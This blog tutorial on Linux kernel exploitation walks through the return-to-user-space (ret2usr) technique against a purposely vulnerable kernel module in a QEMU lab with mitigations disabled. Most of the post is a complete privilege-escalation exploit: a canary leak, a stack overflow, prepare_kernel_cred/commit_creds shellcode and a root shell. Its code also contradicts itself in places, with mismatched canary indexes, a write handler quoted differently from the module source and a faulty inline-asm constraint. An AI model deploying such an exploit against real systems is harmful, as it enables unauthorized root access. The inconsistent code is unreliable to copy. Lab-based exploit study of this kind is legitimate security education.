+++
tags = ["linux","kernel"]
categories = ["Linux Kernel Exploitation"]
date = "2022-01-25"
description = "Our first kernel exploitation technique, returning to user-space. Part two of a series of posts on Linux kernel exploitation techniques."
featuredpath = "date"
linktitle = ""
title = "Linux Kernel 0x01 :: Return to User-space"
slug = "linux-kernel-1-ret2usr"
type = "post"
+++

## Table of Contents
 1. [User-space vs. Kernel-space](#user-space-vs-kernel-space)
 2. [Return to User-space Overview](#return-to-user-space-overview)
 3. [Saving the Initial State](#saving-the-initial-state)
 4. [Restoring the Initial State](#restoring-the-initial-state)
 5. [Escalating Privileges in the Kernel](#escalating-privileges-in-the-kernel)
 6. [A Vulnerable Kernel Module](#a-vulnerable-kernel-module)
 7. [Exploiting the Kernel Module](#exploiting-the-kernel-module)
 8. [Environment Setup](#environment-setup)
 9. [Building the Exploit](#building-the-exploit)


## User-space vs. Kernel-space
Kernel-space is where the kernel runs and provides its services (i.e. where kernel code and kerenl modules run), whereas user-space is where user processes are executed. User-space code runs in it's own carefully segregated piece of memory, where kernel-space code has access to the entirety of system memory.

Within kernel-space all physical memory is available (to some degree, depending on which kernel exploit mitigations are enabled). What this means, is that we are able to read and potentially execute code loaded in user-space.

It is important to note, however, that most kernel exploit mitigations attempt to separate user-space from kernel-space, preventing us from executing any code loaded in user-space.


## Return to User-space Overview
The `ret2usr` exploit technique is very straight-forward. When all kernel exploit mitigations are disabled, you are able to execute user-space code inside kernel-space. This means we can write code that escalates our privileges and returns from kernel-space in order to execute arbitrary code, with the end goal of spawning a root shell.

As a result, all we need to do within our exploit is redirect process execution to user-space code that escalates privileges, returns to user-space and pops a shell.


## Saving the Initial State
Before we can begin exploitation we will need to find some way to save the current user-space state. This is done as the `iretq` instruction will use the information saved below in order to return to user-space.

We save the required registers with the assembly code below in order to build our `iret` frame to later exit kernel-space.

```c
unsigned long save_ss, save_sp, save_rf, save_cs;

void save_user_space()
{
    /* save user-space */
    __asm__(
        ".intel_syntax noprefix;"
        "mov save_ss, ss;"
        "mov save_sp, rsp;"
        "pushf;"
        "pop save_rf;"
        "mov save_cs, cs;"
        ".att_syntax;"
    );
}
```


## Restoring the Initial State
In order to restore the initial state and return to user-space we require two instructions, `swapgs` and `iretq`. In x86\_64 systems the `swapgs` instruction must be made before the `iretq` instruction as it swaps the `gs` register between kernel-mode and user-mode.

We next build our `iret` frame, containing the information required to return to user-space by pushing our saved user-space registers onto the top of the stack. Finally we make our `iretq` instruction to return from kernel-space.

Note: At the very top of our `iret` frame we put the address we want to return to.

```c
void load_user_space(unsigned long target)
{
    /* return to user-space */
    __asm__(
        ".intel_syntax noprefix;"
        "swapgs;"
        "mov r15, save_ss;"
        "push r15;"
        "mov r15, save_sp;"
        "push r15;"
        "mov r15, save_rf;"
        "push r15;"
        "mov r15, save_cs;"
        "push r15;"
        "mov r15, %[rip];"
        "push r15;"
        "iretq;"
        ".att_syntax;"
        : [rip] "=&r" (target)
    );
}
```


## Escalating Privileges in the Kernel
Escalating privileges inside kernel-space is done via two function calls, `prepare_kernel_cred` and `commit_creds`.

The `prepare_kernel_cred` function call creates a credentials struct for whatever uid is provided to it (this will almost always be '0', for the root user). The `commit_creds` function call takes whatever credentials struct is provided to it and applies those privileges to the current user.

We can find the address (in kernel-space) of both these functions by reading the `/proc/kallsyms` file.

```
/ # cat /proc/kallsyms | grep prepare_kernel_cred
ffffffff810881c0 T prepare_kernel_cred
/ # cat /proc/kallsyms | grep commit_creds
ffffffff81087e80 T commit_creds
```

Using the addresses we found earlier, we can write a bit of assembly that escalates our privileges to that of the root user.

```asm
xor    rdi, rdi
movabs rbx, 0xffffffff810881c0  // prepare_kernel_cred
call   rbx
movabs rbx, 0xffffffff81087e80  // commit_creds
mov    rdi, rax
call   rbx
```

Let's place this inside a function so we can easily use it within our final exploit.

```c
void escalate_privileges()
{
    /* escalate privileges */
    __asm__(
        ".intel_syntax noprefix;"
        "xor rdi, rdi;"
        "movabs rbx, 0xffffffff810881c0;"  // prepare_kernel_cred
        "call rbx;"
        "movabs rbx, 0xffffffff81087e80;"  // commit_creds
        "mov rdi, rax;"
        "call rbx;"
        ".att_syntax;"
    );

    /* return to user-space */
    load_user_space(/* target return address */);
}
```


## A Vulnerable Kernel Module
I've written a vulnerable kernel module to demonstrate the exploit technique detailed above. This kernel module has buffer overflow vulnerabilities in both its `challenge_read` and `challenge_write` functions.


{{< code language="c" title="challenge.c" id="1" expand="Show" collapse="Hide" isCollapsed="true" >}}
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>

MODULE_LICENSE("GPL");

static ssize_t challenge_read(struct file *fp, char *buf, size_t len, loff_t *off)
{
    char tmp[128];
    return raw_copy_to_user(buf, tmp, len);
}

static ssize_t challenge_write(struct file *fp, const char *buf, size_t len, loff_t *off)
{
    char tmp[128];
    return raw_copy_from_user(tmp, buf, len);
}

static int challenge_open(struct inode *inode, struct file *fp)
{
    return 0;
}

static int challenge_release(struct inode *inode, struct file *fp)
{
    return 0;
}

static struct file_operations fops = {
    .read    = challenge_read,
    .write   = challenge_write,
    .open    = challenge_open,
    .release = challenge_release
};

struct proc_dir_entry *proc_entry;

int init_module(void)
{
    proc_entry = proc_create("challenge", 0666, NULL, &fops);
    return 0;
}

void cleanup_module(void)
{
    if (proc_entry) {
        proc_remove(proc_entry);
    }
}
{{< /code >}}

In the code block below we can see the kernel module's `read` handler. It copies an arbitrary number of bytes from a 128 byte buffer into a globally accessible buffer `out` of size 256 bytes. This means we can read 128 bytes below the small `tmp` buffer.

Perhaps we can use this to read stack values (e.g. the value of the stack canary).

```c
static ssize_t challenge_read(struct file *fp, char *buf, size_t len, loff_t *off)
{
    char tmp[128];
    return raw_copy_to_user(buf, tmp, len);
}
```

In the code block below we can see the kernel module's `write` handler. It copies an arbitrary number of bytes into a 256 byte buffer `out`, that are then copied into a buffer stored on the stack `tmp` of size 128 bytes.

This gives us a buffer overflow of 128 bytes that we can potentially use to control process execution.

```c
static ssize_t challenge_write(struct file *fp, const char *buf, size_t len, loff_t *off)
{
    char tmp[128];
    return raw_copy_from_user(out, buf, len);
}
```

## Exploiting the Kernel Module
First, let's use the buffer overflow vulnerability in the kernel module's `read` function to dump a bunch of stack values. The below code reads 32 `unsigned long` values (256 bytes) and prints them out.

```c
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <unistd.h>
#include <fcntl.h>

int main(int argc, char **argv)
{
    int fd = open("/proc/challenge", O_RDWR);
    assert(fd > 0);

    unsigned long leak[32];
    read(fd, leak, sizeof(unsigned long) * 32);

    for (int i = 0; i < 32; ++i)
        printf("%d: 0x%lx\n", i, leak[i]);

    return 0;
}
```

In the output below we can see a couple values that look like a stack canary and a return address in kernel-space. We can see these are at indexes 16 and 17. 

```
/home/ctf # ./exploit
0: 0xffffffff81c00194
1: 0xffffffff81c001a0
2: 0xffffffff81aa85a0
3: 0xffffffff81345d8b
4: 0x4
5: 0xffff888006bf5700
6: 0x20000075a4070
7: 0xffff888006bf5710
8: 0x100020000
9: 0x0
10: 0xffff888000000000
11: 0x0
12: 0x0
13: 0x0
14: 0x0
15: 0xa73ee2eeab3d9f00
16: 0xa73ee2eeab3d9f00  <-- stack canary
17: 0xffff888006bcd840  <-- return address
...
```

Now we can write a function that leaks the stack canary, so we can use it later when we want to redirect process execution. From our investigation above we can see that the stack canary is stored at index 16 (just below the `tmp` buffer on the stack).

```c
unsigned long leak_canary(int fd)
{
    unsigned long leak[32];
    read(fd, leak, sizeof(unsigned long) * 32);
    return leak[15];
}
```

We should also write a function that overflows the buffer in the `write` handler and redirect process execution to our `escalate_privileges` function. We'll also want to overwrite the stack canary so the kernel module doesn't detect the overflow and halt execution.

```c
void overflow_buffer(int fd, unsigned long canary)
{
    unsigned long payload[18];

    payload[16] = canary;
    payload[17] = (unsigned long)escalate_privileges;

    write(fd, payload, sizeof(unsigned long) * 18);
}
```


## Environment Setup
In order for this technique to work, we'll need to disable all kernel exploit mitigation features in our kernel emulator. This means removing all instances of `+smep`, `+smap`, `kpti=1` and `kaslr`, and adding the `nokaslr` and `nopti` flags. 

{{< code language="sh" title="launch.sh" id="2" expand="Show" collapse="Hide" isCollapsed="false" >}}
#!/bin/bash

# build root fs
pushd fs
find . -print0 | cpio --null -ov --format=newc | gzip -9 > ../initramfs.cpio.gz
popd

# launch
/usr/bin/qemu-system-x86_64 \
    -kernel linux-5.4/arch/x86/boot/bzImage \
    -initrd $PWD/initramfs.cpio.gz \
    -fsdev local,security_model=passthrough,id=fsdev0,path=$HOME \
    -device virtio-9p-pci,id=fs0,fsdev=fsdev0,mount_tag=hostshare \
    -nographic \
    -monitor none \
    -s \
    -append "console=ttyS0 nokaslr nopti quiet"
{{< /code >}}

Running the build and then the run scripts will drop us into a root shell on the kernel emulator.

```
~/pwnkernel $ ./build.sh
...
~/pwnkernel $ ./launch.sh
/ # id
uid=0(root) gid=0
```


## Building the Exploit
First, let's write a simple function that will spawn a shell via the `system` function. We'll need this after we return to user-space after escalating privileges.

```c
void shell()
{
    system("/bin/sh");
}
```

Now let's write the main logic of our exploit, it will do several things:
 1. Save the initial user-space state.
 2. Leak the stack canary with the vulnerability in the `read` handler to perform a safe overflow.
 3. Overflow the vulnerable buffer and redirect execution to our `escalate_privileges` function.
 4. Escalate privileges in kernel-space.
 5. Return to user-space and get a root shell.

```c
int main(int argc, char **argv)
{
    save_user_space();

    int fd = open("/proc/challenge", O_RDWR);
    assert(fd > 0);

    /* leak stack canary */
    unsigned long canary = leak_canary(fd);
    printf("[*] canary @ 0x%lx\n", canary);

    overflow_buffer(fd, canary); 

    return 0;
}
```

You can find the complete exploit code below.

{{< code language="c" title="exploit.c" id="3" expand="Show" collapse="Hide" isCollapsed="true" >}}
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <unistd.h>
#include <fcntl.h>

unsigned long save_ss, save_sp, save_rf, save_cs;

void shell()
{
    system("/bin/sh");
}

void save_user_space()
{
    /* save user-space */
    __asm__(
        ".intel_syntax noprefix;"
        "mov save_ss, ss;"
        "mov save_sp, rsp;"
        "pushf;"
        "pop save_rf;"
        "mov save_cs, cs;"
        ".att_syntax;"
    ); 
}

void load_user_space(unsigned long target)
{
    /* return to user-space */
    __asm__(
        ".intel_syntax noprefix;"
        "swapgs;"
        "mov r15, save_ss;"
        "push r15;"
        "mov r15, save_sp;"
        "push r15;"
        "mov r15, save_rf;"
        "push r15;"
        "mov r15, save_cs;"
        "push r15;"
        "mov r15, %[rip];"
        "push r15;"
        "iretq;"
        ".att_syntax;"
        : [rip] "=&r" (target)
    );
}

void escalate_privileges()
{
    /* escalate privileges */
    __asm__(
        ".intel_syntax noprefix;"
        "xor rdi, rdi;"
        "movabs rbx, 0xffffffff810881c0;"  // prepare_kernel_cred
        "call rbx;"
        "movabs rbx, 0xffffffff81087e80;"  // commit_creds
        "mov rdi, rax;"
        "call rbx;"
        ".att_syntax;"
    );

    /* return to user-space */
    load_user_space((unsigned long)shell);
}

unsigned long leak_canary(int fd)
{
    unsigned long leak[32];
    read(fd, leak, sizeof(unsigned long) * 32);
    return leak[15];
}

void overflow_buffer(int fd, unsigned long canary)
{
    unsigned long payload[18];

    payload[15] = canary;
    payload[17] = (unsigned long)escalate_privileges;

    write(fd, payload, sizeof(unsigned long) * 18);
}

int main(int argc, char **argv)
{
    save_user_space();

    int fd = open("/proc/challenge", O_RDWR);
    assert(fd > 0);

    /* leak stack canary */
    unsigned long canary = leak_canary(fd);
    printf("[*] canary @ 0x%lx\n", canary);

    overflow_buffer(fd, canary); 

    return 0;
}
{{< /code >}}

Note that the exploit code will need to be compiled as a static executable in order to run on the kernel emulator.

```
~/ $ gcc exploit.c -o exploit -static
```

After inserting the vulnerable kernel module and running our exploit we can see that our exploit leaked the stack canary and gave us a root shell.

```
/ # insmod challenge.ko
/ # su ctf
/ $ /home/ctf/exploit
...
/ # id
/ # uid=0(root) gid=0
```

## Appendix
 - [Learning Linux Kernel Exploitation - Part 1](https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/)
 - [iSecLab - Kernel-mode exploits primer](http://old.iseclab.org/projects/vifuzz/docs/exploit.pdf)


